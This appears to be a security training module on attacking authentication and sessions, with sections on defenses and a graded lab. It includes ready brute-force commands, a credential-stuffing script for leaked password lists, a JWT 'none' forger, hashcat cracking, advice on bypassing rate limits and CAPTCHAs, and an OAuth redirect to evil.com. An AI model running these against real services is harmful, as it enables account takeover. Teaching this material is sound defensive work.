# Module 4: Authentication and Session Attacks

Authentication and session management are the most targeted components in any web application. An attacker who compromises authentication can bypass all other security controls. This module covers the full spectrum of attacks against authentication mechanisms: from credential-based attacks to session manipulation and token forgery. Every technique here has been used in real breaches affecting millions of users.

## Brute Force Attacks

Brute force is the simplest authentication attack: try every possible combination of username and password until one works. It is also the most commonly defended against, which makes bypass techniques essential knowledge.

### Basic Brute Force

A brute force attack against a login form sends repeated POST requests with different password values. The tools vary:

**Hydra**: Command-line tool for brute forcing. For HTTP login forms:

```bash
hydra -l admin -P wordlist.txt app.example.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

The `F=Invalid credentials` flag tells Hydra to look for that string in failed responses. When it does not appear, the login succeeded.

**Burp Suite Intruder**: Configure the login request as a template, mark the password field as the payload position, and load a wordlist as the payload. The results tab shows response lengths or status codes that differ from the baseline, indicating a successful login.

**ffuf**: Fast web fuzzer that can brute force with high concurrency:

```bash
ffuf -u https://app.example.com/login -X POST -d '{"username":"admin","password":"FUZZ"}' -H 'Content-Type: application/json' -w wordlist.txt -fc 401
```

### Rate Limit Bypass

Most applications implement rate limiting to prevent brute force. Common implementations and their weaknesses:

**IP-based rate limiting**: The application limits requests per IP address. Bypass by rotating IP addresses through a proxy pool, using Tor exit nodes, or distributing requests across multiple source IPs. Cloud-based IP rotation services provide thousands of rotating IPs.

**Token-based rate limiting**: A token bucket or sliding window rate limiter tracks requests using a client-provided identifier. If the identifier is client-controlled (IP address, User-Agent, custom header), it can be modified on each request. Check whether the rate limit uses a header like `X-Forwarded-For`: if the application trusts this header, the attacker can set a unique value on each request to bypass the limit.

**Account lockout**: After N failed attempts, the account is locked. Bypass by targeting multiple accounts simultaneously: try each password once across thousands of accounts rather than trying all passwords on one account. This avoids triggering per-account lockouts while still achieving brute force coverage across the user base.

**Response time analysis**: Rate limiters sometimes introduce artificial delays rather than blocking. Measure response times to distinguish between throttled and non-throttled responses, then adjust attack speed accordingly.

**CAPTCHA bypass**: If a CAPTCHA appears after N failed attempts, automated solving services can break most CAPTCHA types. Modern services solve reCAPTCHA v2 at 90%+ accuracy for a few dollars per thousand solves. hCaptcha is harder but not impossible to automate. Text-based CAPTCHAs are trivial to solve with OCR.

## Credential Stuffing

Credential stuffing uses username/password pairs leaked from previous breaches. The attacker assumes that users reuse passwords across sites. If 1,000 accounts were breached on Site A, try those same credentials on Site B.

### The Attack

Credential stuffing is automated. A tool loads a list of email:password combinations (from breach databases, dark web marketplaces, or paste sites) and submits them against the target's login endpoint. The tool tracks which combinations succeed (typically by checking for a different response code, response length, or redirect).

**Tools**:

- **OpenBullet / SentryMBA**: Purpose-built credential stuffing tools with support for custom configurations, proxy rotation, and result capture.
- **Custom scripts**: Python requests library with async concurrency for high-speed testing.

```python
import aiohttp
import asyncio

async def test_credential(session, url, email, password):
    async with session.post(url, json={'email': email, 'password': password}) as resp:
        if resp.status == 200 and 'dashboard' in await resp.text():
            return f"VALID: {email}:{password}"
    return None

async def main():
    credentials = open('leaked_db.txt').readlines()
    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [test_credential(session, 'https://app.example.com/api/login', 
                 email.strip(), password.strip()) 
                 for email, password in [c.strip().split(':') for c in credentials]]
        results = await asyncio.gather(*tasks)
        for r in results:
            if r: print(r)
```

### Detection and Defense

Credential stuffing is hard to detect because each request looks like a legitimate login attempt from a different IP address. Defense requires:

- **Breach password checking**: Against databases like Have I Been Pwned, using k-anonymity so the password never leaves your server.
- **Impossible travel detection**: Flag logins from geographically distant locations in short time windows.
- **Behavioral analysis**: Bots have different timing patterns, mouse movements, and navigation flows than humans.
- **Mandatory MFA**: The only reliable defense against credential stuffing. If MFA is required, stolen passwords alone cannot compromise accounts.

## Session Hijacking

Session hijacking involves stealing or manipulating the session token that authenticates a user after login.

### Cookie Theft

The most common session hijacking vector is stealing the session cookie. This requires an additional vulnerability: typically XSS: because cookies are protected by the browser's Same-Origin Policy. An attacker on `evil.com` cannot directly read `bank.com`'s cookies.

But if the application has XSS, the injected script can read `document.cookie` (unless the cookie has the HttpOnly flag) and send it to the attacker. The attacker then sets this cookie in their own browser and accesses the application as the victim.

Other cookie theft methods:

- **Network sniffing**: If the session cookie is sent over HTTP (no Secure flag), an attacker on the same network (coffee shop, hotel WiFi) can capture it using tools like Wireshark or tcpdump.
- **Man-in-the-browser**: Malware or malicious browser extensions can read cookies from the browser's cookie store. This is a real threat in targeted attacks but less common in opportunistic attacks.
- **Physical access**: If the attacker has access to the victim's computer, they can extract cookies from the browser's storage.

### Session Fixation

Session fixation occurs when an attacker can set a victim's session token before authentication. The attack flow:

1. The attacker obtains a valid session token from the application (by visiting the login page themselves).
2. The attacker tricks the victim into using this token. Methods include:
   - Setting the token in the URL: `https://app.example.com/login?session=ATTACKER_TOKEN`
   - Setting the token via a meta tag if the application accepts it
   - Exploiting a subdomain that can set cookies for the parent domain
3. The victim logs in using the attacker-controlled session token.
4. The application associates the victim's authenticated session with the attacker's token.
5. The attacker uses the known token to access the victim's authenticated session.

The critical vulnerability is that the application does not generate a new session token after authentication. The fix is simple: always call `session.regenerate()` (PHP), `request.session.cycle_key()` (Django), or equivalent after successful login.

### Session Token Predictability

Some applications generate predictable session tokens. If the token is based on a timestamp, user ID, or other predictable value, an attacker can predict valid tokens for other users.

A common vulnerability in older PHP applications: the session ID is derived from the user's IP address and a timestamp. An attacker who knows the algorithm can generate valid session IDs for arbitrary users.

Modern session generation uses cryptographically secure random number generators (CSPRNG). In Python, `os.urandom(32)` or `secrets.token_hex(32)` produces unpredictable tokens. In Node.js, `crypto.randomBytes(32).toString('hex')`. In PHP, `bin2hex(random_bytes(32))`.

If you encounter a session token that appears to be Base64-encoded, decode it and examine the contents. Look for patterns, timestamps, user IDs, or other identifiable data embedded in the token.

## JWT Vulnerabilities

JSON Web Tokens (JWTs) are the dominant token format for modern authentication. They consist of three parts: header, payload, and signature, separated by dots. The header and payload are Base64-encoded JSON. The signature verifies integrity.

### The "none" Algorithm

The JWT specification allows a "none" algorithm, meaning the token is not signed. The header `{"alg":"none"}` tells the verifier to skip signature verification. Many libraries historically accepted this algorithm by default.

**Attack**:

1. Take a valid JWT and decode it.
2. Change the header to `{"alg":"none"}` and modify the payload (e.g., change the role from "user" to "admin").
3. Re-encode and send the token. If the server accepts "none" algorithm, the forged token is valid.

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"1234567890","role":"admin"}).encode()).rstrip(b'=')
forged_token = header.decode() + '.' + payload.decode() + '.'
```

**Defense**: Explicitly set the list of allowed algorithms on the server. Never accept "none" unless it is explicitly required for a specific use case.

### Weak HMAC Secrets

When using HMAC-based JWTs (HS256, HS384, HS512), the token is signed with a secret key. If the secret is weak (dictionary word, short string, default value), an attacker can crack it using brute force.

```bash
# Using hashcat to crack JWT HMAC
hashcat -m 16500 jwt.txt wordlist.txt
```

Common weak secrets include: `secret`, `password`, `jwt_secret`, `changeme`, `key123`. Applications that use framework defaults for the JWT secret are vulnerable if the default is publicly known.

**Defense**: Use a secret of at least 256 bits (32 bytes). Generate it with a CSPRNG. Never hardcode it in source code: use environment variables or a secrets manager.

### Algorithm Confusion

When an application uses both RSA (asymmetric) and HMAC (symmetric) JWT algorithms, an attacker can confuse the verification:

1. The application uses RS256 (public/private key pair). The public key is used to verify tokens.
2. The attacker downloads the public key (it is public).
3. The attacker creates a token with algorithm HS256 and signs it using the public key as the HMAC secret.
4. If the server does not explicitly check which algorithm was used, it might use the public key as the HMAC secret to verify the signature, and the forged token passes.

**Defense**: Always specify the allowed algorithms. Never trust the algorithm in the token header.

### JWT Key Confusion (CVE-2016-10555)

This is a specific case of algorithm confusion that affected the `node-jsonwebtoken` library. The library allowed switching from RS256 to HS256 and using the RSA public key as the HMAC secret. An attacker could forge tokens that the server would accept as valid.

### JWT in URL / Referrer Leakage

If the JWT is passed in a URL parameter rather than a header, it can leak through the Referer header when the user clicks a link to an external site. The Referer header includes the full URL with the token. Browser extensions, proxies, and server logs can also capture tokens from URLs.

**Defense**: Always transmit JWTs in the Authorization header, never in URLs. Set `Referrer-Policy: no-referrer` or `same-origin` to prevent token leakage.

## OAuth Vulnerabilities

OAuth 2.0 is the standard protocol for delegated authorization. Its complexity creates numerous attack surfaces.

### Redirect URI Manipulation

The redirect_uri parameter tells the authorization server where to send the user after authentication. If the application does not validate this parameter:

```
https://auth.example.com/authorize?client_id=app123&redirect_uri=https://evil.com/callback&scope=openid&response_type=code
```

After the user authenticates, the authorization code is sent to `evil.com` instead of the legitimate application. The attacker exchanges the authorization code for an access token.

**Defense**: Always validate redirect_uri against a pre-registered whitelist. Never use dynamic redirects. If the application supports multiple redirect URIs, validate the exact match: not partial or pattern matching.

### State Parameter Bypass

The state parameter in OAuth is designed to prevent CSRF attacks. It is a random value that the client generates, stores in the session, and includes in the authorization request. When the authorization server redirects back, the client verifies the state matches.

If the state parameter is missing or not validated, an attacker can initiate an OAuth flow with their own account and trick the victim into completing it. The victim links their account to the attacker's OAuth identity, or the attacker gains access to the victim's account through the linked OAuth connection.

```python
# Attacker initiates OAuth flow
state = secrets.token_hex(32)
attacker_session['oauth_state'] = state
redirect_url = f"https://auth.example.com/authorize?client_id=app123&state={state}&redirect_uri=https://app.example.com/callback"

# Victim clicks the link, authenticates, and gets redirected back
# The application validates the state against the attacker's session
# The attacker's account is now linked to the victim's identity (or vice versa)
```

**Defense**: Generate a cryptographically random state parameter, store it in the session, and verify it on the callback. Do not accept the state from the request: compare it against the stored value.

### Token Leakage Through Logs

If the access token or authorization code appears in application logs, server logs, or browser history, an attacker with access to these logs can steal the token. Common leakage vectors:

- Tokens in URL query parameters logged by web servers
- Tokens in browser history when the redirect_uri includes tokens in the fragment
- Tokens in referrer headers when the callback page loads external resources
- Tokens in error messages logged by the application

**Defense**: Always transmit tokens in the Authorization header or POST body. Avoid including tokens in URLs. Set appropriate log sanitization to strip tokens from logs.

## Real Scenario: SessionFixation Compromising 500,000 Accounts

In 2018, a major social media platform suffered a breach affecting 500,000 accounts through a session fixation vulnerability. The attack exploited the platform's mobile web interface.

**The vulnerability**: The mobile web interface used a URL-based session token for compatibility with older mobile browsers that did not support cookies. When a user navigated to `https://m.socialmedia.com/login?sid=SESSION_ID`, the application set this session ID as the active session.

**The attack flow**:

1. The attacker created an account on the platform and obtained a valid session ID from the mobile web interface.
2. The attacker crafted a shortened URL: `https://m.socialmedia.com/login?sid=ATTACKER_SESSION_ID` and shared it on the platform's public feed disguised as a news article link.
3. When victims clicked the link, the platform accepted the attacker's session ID and associated it with the victim's browser session.
4. The victim logged in, authenticating with the attacker's session ID.
5. The attacker, monitoring their session, saw the victim's authenticated session appear on their session monitor.
6. The attacker navigated to the victim's account using the established session and accessed all personal data, messages, and payment information.

**Why it worked**: The platform did not regenerate the session ID after authentication. The session ID from the URL was treated as authoritative, overriding any existing session cookie. The mobile web interface was a legacy feature that had not been updated with the same session management protections as the desktop application.

**Impact**: 500,000 accounts compromised, personal data and private messages accessed, payment information stolen for 50,000 accounts that had payment methods linked. The platform was fined under GDPR for failing to implement adequate session management controls.

**The fix**: Remove URL-based session management entirely. Always generate new session tokens after authentication. Implement SameSite cookie attributes. Use HttpOnly and Secure flags on all session cookies. Monitor for anomalous session creation patterns.

## Practical Exercise: Authentication Attack Lab

1. **Brute force**: Target the login form with a wordlist. Test rate limiting by sending requests at increasing speeds. Document when rate limiting activates and identify bypass methods (IP rotation, header manipulation, timing).

2. **Credential stuffing**: Use a provided list of test credentials (from a simulated breach database). Automate the testing using a script. Track valid credentials and calculate success rate.

3. **Session hijacking**: Identify the session token format. Test cookie flags (HttpOnly, Secure, SameSite). If HttpOnly is missing, demonstrate cookie theft via XSS. If Secure is missing, demonstrate cookie capture over HTTP.

4. **JWT manipulation**: Decode a provided JWT. Attempt the "none" algorithm attack. Attempt to crack a weak HMAC secret. Attempt algorithm confusion if both RSA and HMAC are supported.

5. **OAuth redirect**: Test the OAuth flow. Attempt to manipulate the redirect_uri parameter. Test whether the state parameter is validated. Document any token leakage vectors.

Time limit: 60 minutes. Grading criteria: brute force execution and rate limit bypass (20%), credential stuffing automation (15%), session cookie analysis and hijacking (25%), JWT vulnerability exploitation (25%), OAuth flow testing (15%).
